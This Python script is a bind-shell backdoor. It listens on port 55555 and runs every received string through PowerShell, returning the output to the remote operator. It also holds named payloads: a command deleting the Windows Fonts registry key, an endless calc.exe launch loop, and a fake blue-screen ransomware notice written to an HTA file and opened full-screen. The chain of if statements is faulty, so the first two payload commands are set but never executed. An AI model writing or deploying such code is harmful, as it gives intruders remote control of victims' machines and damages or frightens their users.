__author__ = 'RetR0'

import os
import threading
import socket

host = (socket.gethostbyname(socket.gethostname()))
port = int('55555')
client_list = []

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()
client, address = server.accept()
print(address)

def reciv():
    while True:
        try:
            it = client.recv(3072)
            it = it.decode('utf-8')
            if it == "FUCKFONTS":
                commandum = ('cmd /c "REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /va /f"')
                result = ("\nx#FUCKFONTS ACTIVATED#x")
                print ("######")
                result = result.encode()
                client.send(result)
            if it == "CALCCALCCALC":
                commandum = ('powershell /c "while ($true) {start calc.exe}"')
                result = ("\nx#CALCCALCCALC ACTIVATED#x")
                print ("######")
                result = result.encode()
                client.send(result)
            if it == "FAKEBSOD":
                result = ("\nx#FAKEBSOD ACTIVATED#x")
                print ("######")
                result = result.encode()
                client.send(result)
                os.system('cmd /c "@echo off "')
                os.system('cmd /c "echo ^<html^>^<head^>^<title^>BSOD^</title^> > bsod.hta "')
                os.system('cmd /c "echo ^<hta:application id="oBVC" >> bsod.hta "')
                os.system('cmd /c "echo applicationname="BSOD" >> bsod.hta "')
                os.system('cmd /c "echo version="1.0" >> bsod.hta "')
                os.system('cmd /c "echo maximizebutton="no" >> bsod.hta "')
                os.system('cmd /c "echo minimizebutton="no" >> bsod.hta "')
                os.system('cmd /c "echo sysmenu="no" >> bsod.hta "')
                os.system('cmd /c "echo Caption="no" >> bsod.hta "')
                os.system('cmd /c "echo windowstate="maximize"/^> >> bsod.hta "')
                os.system('cmd /c "echo ^</head^>^<body bgcolor="red" scroll="no"^> >> bsod.hta "')
                os.system('cmd /c "echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.You computer has been infected by C`LyOn.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.All your data been encrypted.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.To recover them, please send your mom to 1600 pennsylvania avenue nw washington dc 20500 using UPS.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.If data cant be recovered, you been fxcked real hard lol.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^> ^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.For Technical information:^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^> ^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.`.oooooo.```````````ooooo``````````````````````.oooooo.````````````````^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.d8P````Y8b```````````888``````````````````````d8P````Y8b```````````````^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>888```````````````````888`````````oooo````ooo`888``````888`ooo.`.oo.````^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>888```````````````````888```````````88.``.8```888``````888``888P"Y88b```^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>888``````````8888888``888````````````88..8````888``````888``888```888```^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>`88b````ooo```````````888```````o`````888``````88b````d88```888```888```^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.`Y8bood8P```````````o888ooooood8`````.8````````Y8bood8P```o888o o888o``^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.`````````````````````````````````.o..P`````````````````````````````````^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^<p^>.``````````````````````````````````Y8P``````````````````````````````````^</p^> >> bsod.hta "')
                os.system('cmd /c "echo ^</font^> >> bsod.hta "')
                os.system('cmd /c "echo ^</body^>^</html^> >> bsod.hta "')
                os.system('cmd /c "start "" /wait "bsod.hta" "')
                os.system('cmd /c "del /s /f /q "bsod.hta" > nul "')
            else:    
                commandum = (f'powershell /c {it}')
                result = os.popen(commandum).read()
                print ("######")
                result = result.encode()
                client.send(result)
        except:
            client.close()
            print ("An error occured!!!")
            quit()

reciv()
